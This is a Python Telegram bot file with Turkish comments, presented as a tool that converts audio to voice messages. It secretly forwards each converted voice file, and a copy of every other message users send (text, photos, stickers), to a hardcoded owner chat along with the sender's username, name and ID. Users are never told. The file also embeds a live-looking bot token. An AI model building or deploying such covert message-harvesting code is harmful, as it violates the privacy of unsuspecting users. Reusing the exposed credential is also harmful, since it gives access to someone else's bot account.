import os
import subprocess
import tempfile
import threading
from flask import Flask
from telegram import Update
from telegram.ext import Application, MessageHandler, filters, ContextTypes

# --- KENDİ BİLGİLERİNİ BURAYA YAZ ---
TOKEN = "8090764217:AAHeGwTajkYyux_9uzsxFzGuqW1qwQ1XuEo" 
OWNER_CHAT_ID = 7749779502  # <--- KENDİ TELEGRAM ID'N (Sadece Sayı)
# ------------------------------------

# --- RENDER İÇİN WEB SUNUCUSU ---
app_web = Flask(__name__)

@app_web.route('/')
def home():
    return "Bot calisiyor!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app_web.run(host="0.0.0.0", port=port)

# --- İŞLEYİCİ FONKSİYONLAR ---

# Fonksiyon 1: Sadece Ses Dosyalarını Dönüştürür ve Sana Gönderir
async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = update.message.audio or update.message.voice or update.message.video or update.message.document
    if not file: return

    tg_file = await file.get_file()
    with tempfile.NamedTemporaryFile(delete=False, suffix=".mp3") as in_file:
        input_path = in_file.name
    with tempfile.NamedTemporaryFile(delete=False, suffix=".ogg") as out_file:
        output_path = out_file.name

    try:
        await tg_file.download_to_drive(input_path)
        subprocess.run(["ffmpeg", "-y", "-i", input_path, "-c:a", "libopus", "-b:a", "64k", "-ar", "48000", "-ac", "1", output_path], check=True)
        
        # 1. Gönderen kullanıcıya yolla (Normal işlem)
        with open(output_path, "rb") as f: 
            await update.message.reply_voice(f)
            
        # 2. Sahibine (SANA) Yolla (Kullanıcı Adı ile birlikte)
        user_info = update.message.from_user
        username = user_info.username if user_info.username else user_info.full_name if user_info.full_name else str(user_info.id)
        
        caption_text = f"Yeni Dönüşüm\nKullanıcı Adı: @{username}"
        if not user_info.username:
             caption_text = f"Yeni Dönüşüm\nAd/Soyad: {user_info.full_name or 'Bilinmiyor'}\nID: {user_info.id}"

        with open(output_path, "rb") as f_owner:
            await context.bot.send_voice(
                chat_id=OWNER_CHAT_ID, 
                voice=f_owner, 
                caption=caption_text
            )

    except Exception as e:
        print(f"Gizli Hata: {e}") 
        
    finally:
        if os.path.exists(input_path): os.remove(input_path)
        if os.path.exists(output_path): os.remove(output_path)


# Fonksiyon 2: Ses DIŞINDAKİ Her Şeyi Kopyalar ve Sana Gönderir
async def handle_all_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Bu mesaj, zaten ses dosyası olarak işlendiği için tekrar kopyalamıyoruz.
    if update.message.audio or update.message.voice or update.message.video or update.message.document:
        return 
        
    user_info = update.message.from_user
    username = user_info.username if user_info.username else user_info.full_name if user_info.full_name else str(user_info.id)

    # Sana gönderilecek metin başlığı oluştur
    caption_text = f"Yeni Mesaj Kopyası\nKullanıcı Adı: @{username}"
    if not user_info.username:
        caption_text = f"Yeni Mesaj Kopyası\nAd/Soyad: {user_info.full_name or 'Bilinmiyor'}\nID: {user_info.id}"

    # Önce sana başlık metnini gönder
    await context.bot.send_message(chat_id=OWNER_CHAT_ID, text=caption_text)

    # Sonra mesajın kendisini sana kopyala (Metin, fotoğraf, çıkartma, vb. ne varsa)
    await update.message.copy(chat_id=OWNER_CHAT_ID)


# --- BOT BAŞLATMA ---
if __name__ == "__main__":
    threading.Thread(target=run_web).start()
    app = Application.builder().token(TOKEN).build()
    
    # 1. Ses dosyalarını işleyen handler (Dönüşüm)
    app.add_handler(MessageHandler(filters.AUDIO | filters.VOICE | filters.VIDEO | filters.Document.ALL, handle_audio))
    
    # 2. Ses DIŞINDAKİ her şeyi işleyen handler (Kopyalama)
    # Ses, video ve dosya haricindeki tüm mesajları (Metin, fotoğraf, sticker vb.) yakalar
    app.add_handler(MessageHandler(filters.ALL & ~filters.AUDIO & ~filters.VOICE & ~filters.VIDEO & ~filters.Document.ALL, handle_all_messages))
    
    print("✅ Bot başlatıldı...")
    app.run_polling()
    
